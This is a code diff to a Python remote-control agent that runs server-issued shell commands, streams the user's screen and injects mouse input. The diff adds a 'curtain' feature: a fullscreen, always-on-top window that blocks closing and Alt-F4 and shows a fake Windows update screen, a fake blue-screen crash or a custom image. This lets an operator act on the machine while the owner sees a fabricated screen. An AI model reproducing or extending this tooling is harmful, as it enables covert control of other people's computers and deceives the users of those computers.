@@ -18,10 +18,9 @@ import websocket
 
 try:
     import mss
-    from PIL import Image
-    MSS_AVAILABLE = True
+    from PIL import Image, ImageGrab
 except Exception:
-    MSS_AVAILABLE = False
+    from PIL import Image, ImageGrab
 
 try:
     from pynput.mouse import Controller as MouseController, Button
@@ -46,6 +45,7 @@ class Agent:
         self.shell = None
         self.current_session_id = None
         self.remote_active = False
+        self.curtain_proc = None
 
     def _get_user(self):
         try:
@@ -93,6 +93,10 @@ class Agent:
                 proc = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, timeout=120)
             elif shell == "cmd":
                 proc = subprocess.run(["cmd", "/c", command], capture_output=True, text=True, timeout=120)
+            elif shell == "curtain":
+                self.run_curtain(command)
+                self.report_result(cmd_id, 0, "Curtain updated")
+                return
             else:
                 proc = subprocess.run([shell, "-c", command], capture_output=True, text=True, timeout=120)
             output = proc.stdout + proc.stderr
@@ -109,6 +113,96 @@ class Agent:
             }, timeout=10)
         except Exception as e:
             print("Report failed:", e)
+
+    def run_curtain(self, command):
+        if command == "remove":
+            if getattr(self, "curtain_proc", None):
+                try:
+                    self.curtain_proc.kill()
+                except Exception:
+                    pass
+                self.curtain_proc = None
+            return
+        script = self._curtain_script(command)
+        if getattr(self, "curtain_proc", None):
+            try:
+                self.curtain_proc.kill()
+            except Exception:
+                pass
+        try:
+            env = os.environ.copy()
+            if sys.platform.startswith("linux") and not env.get("DISPLAY"):
+                env["DISPLAY"] = ":0"
+            self.curtain_proc = subprocess.Popen([sys.executable, "-c", script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
+        except Exception as e:
+            print("Curtain failed:", e)
+
+    def _curtain_script(self, command):
+        action, _, arg = command.partition(":")
+        return '''
+import tkinter as tk
+from PIL import Image, ImageTk
+action = "__ACTION__"
+arg = "__ARG__"
+root = tk.Tk()
+root.overrideredirect(True)
+root.attributes("-fullscreen", True)
+root.attributes("-topmost", True)
+root.protocol("WM_DELETE_WINDOW", lambda: None)
+root.bind("<Alt-F4>", lambda e: "break")
+screen_w = root.winfo_screenwidth()
+screen_h = root.winfo_screenheight()
+root.geometry(f"{screen_w}x{screen_h}+0+0")
+if action == "black":
+    root.configure(bg="black")
+elif action in ("update", "config"):
+    bg = "#1a1a1a"
+    root.configure(bg=bg)
+    canvas = tk.Canvas(root, bg=bg, highlightthickness=0)
+    canvas.pack(expand=True, fill="both")
+    size = 80
+    gap = 6
+    x0 = screen_w // 2 - size - gap
+    y0 = screen_h // 2 - size - gap - 80
+    colors = ["#f25022", "#7fba00", "#00a4ef", "#ffb900"]
+    rects = [(0, 0), (1, 0), (0, 1), (1, 1)]
+    for (i, j), col in zip(rects, colors):
+        canvas.create_rectangle(x0 + i*(size+gap), y0 + j*(size+gap), x0 + i*(size+gap)+size, y0 + j*(size+gap)+size, fill=col, outline=col)
+    if action == "update":
+        main_text = "Working on updates"
+        sub_text = "100% complete\\nDon't turn off your PC. This will take a while."
+    else:
+        main_text = "Configuring Windows Updates"
+        sub_text = "0% complete\\nDo not turn off your computer."
+    canvas.create_text(screen_w//2, y0 + size*2 + gap*2 + 60, text=main_text, fill="white", font=("Segoe UI", 42))
+    canvas.create_text(screen_w//2, y0 + size*2 + gap*2 + 130, text=sub_text, fill="#cccccc", font=("Segoe UI", 20), justify="center")
+    spinner = canvas.create_text(screen_w//2, y0 + size*2 + gap*2 + 220, text="", fill="white", font=("Segoe UI", 32))
+    dots = ["", ".", "..", "..."]
+    def animate(i=0):
+        canvas.itemconfig(spinner, text=dots[i % 4])
+        root.after(500, animate, i+1)
+    animate()
+elif action == "bsod":
+    root.configure(bg="#0078D7")
+    canvas = tk.Canvas(root, bg="#0078D7", highlightthickness=0)
+    canvas.pack(expand=True, fill="both")
+    canvas.create_text(120, 120, text=":(", fill="white", font=("Segoe UI", 140), anchor="w")
+    canvas.create_text(120, 280, text="Your PC ran into a problem and needs to restart. We\\'re just collecting\\nsome error info, and then we\\'ll restart for you.", fill="white", font=("Segoe UI Light", 24), anchor="w", justify="left")
+    canvas.create_text(120, 380, text="0% complete", fill="white", font=("Segoe UI", 18), anchor="w")
+    canvas.create_rectangle(screen_w-300, screen_h-300, screen_w-100, screen_h-100, fill="white", outline="white")
+    canvas.create_text(screen_w-330, screen_h-200, text="For more information about this issue and possible fixes, visit\\nhttps://www.windows.com/stopcode", fill="white", font=("Segoe UI", 14), anchor="e", justify="left")
+    canvas.create_text(screen_w-330, screen_h-130, text="Stop code: CRITICAL_PROCESS_DIED", fill="white", font=("Segoe UI", 14), anchor="e")
+elif action == "custom" and arg:
+    try:
+        img = Image.open(arg)
+        img = ImageTk.PhotoImage(img.resize((screen_w, screen_h), Image.Resampling.LANCZOS))
+        lbl = tk.Label(root, image=img, bg="black")
+        lbl.image = img
+        lbl.pack(fill="both", expand=True)
+    except Exception as e:
+        tk.Label(root, text=f"Could not load image: {e}", fg="white", bg="black", font=("Segoe UI", 20)).pack(expand=True)
+root.mainloop()
+'''.replace("__ACTION__", action).replace("__ARG__", arg)
 
     def collect_software_windows(self):
         cmd = r"Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | ConvertTo-Json"
@@ -255,24 +349,18 @@ class Agent:
             self.send_ws({"type": "error", "text": str(e), "session_id": session_id})
 
     def remote_stream(self, session_id):
-        if not MSS_AVAILABLE:
-            self.send_ws({"type": "error", "text": "Screen capture not available", "session_id": session_id})
-            return
-        with mss.mss() as sct:
-            while self.remote_active:
-                try:
-                    monitor = sct.monitors[1]
-                    img = sct.grab(monitor)
-                    pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
-                    pil.thumbnail((1280, 720))
-                    buf = io.BytesIO()
-                    pil.save(buf, format="JPEG", quality=50)
-                    b64 = base64.b64encode(buf.getvalue()).decode()
-                    self.send_ws({"type": "frame", "data": "data:image/jpeg;base64," + b64, "session_id": session_id})
-                    time.sleep(0.2)
-                except Exception as e:
-                    print("Remote stream error:", e)
-                    time.sleep(1)
+        while self.remote_active:
+            try:
+                pil = ImageGrab.grab()
+                pil.thumbnail((1280, 720))
+                buf = io.BytesIO()
+                pil.save(buf, format="JPEG", quality=50)
+                b64 = base64.b64encode(buf.getvalue()).decode()
+                self.send_ws({"type": "frame", "data": "data:image/jpeg;base64," + b64, "session_id": session_id})
+                time.sleep(0.2)
+            except Exception as e:
+                print("Remote stream error:", e)
+                time.sleep(1)
 
     def handle_remote_input(self, msg):
         if not PYNPUT_AVAILABLE:
